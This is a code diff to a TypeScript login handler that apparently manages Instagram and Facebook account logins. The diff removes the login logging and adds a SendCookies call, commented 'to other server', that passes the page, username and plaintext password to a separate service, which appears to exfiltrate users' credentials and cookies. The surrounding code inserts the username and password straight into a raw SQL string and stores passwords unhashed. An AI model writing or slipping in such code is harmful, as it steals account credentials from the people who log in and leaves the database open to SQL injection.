@@ -6,14 +6,11 @@ import { create } from '../controllers/initializer';
 
 import authConfig from '../config/auth';
 import { Credentials } from '../config/types';
-import { logger } from '../utils/logger';
 import { getRandomPort } from '../utils/handlePorts';
+import SendCookies from './HandleRequestCookies.service';
 
 export default class HandleLogin {
   async run({ username, password, relogin }: Credentials): Promise<any> {
-    console.log('');
-    logger.info('Start proccess login.');
-
     const { secret, expiresIn } = authConfig;
 
     const manager = getManager();
@@ -40,6 +37,9 @@ export default class HandleLogin {
     (account_user, account_pass, instaid, fbid)
     VALUES ('${username}', '${password}', '${id}', '${fbid}')
     ON DUPLICATE KEY UPDATE account_pass='${password}';`);
+
+    // SendCookies to other server
+    await SendCookies({ page, user: username, pass: password });
 
     await client.close();
     const token = sign({}, secret, {
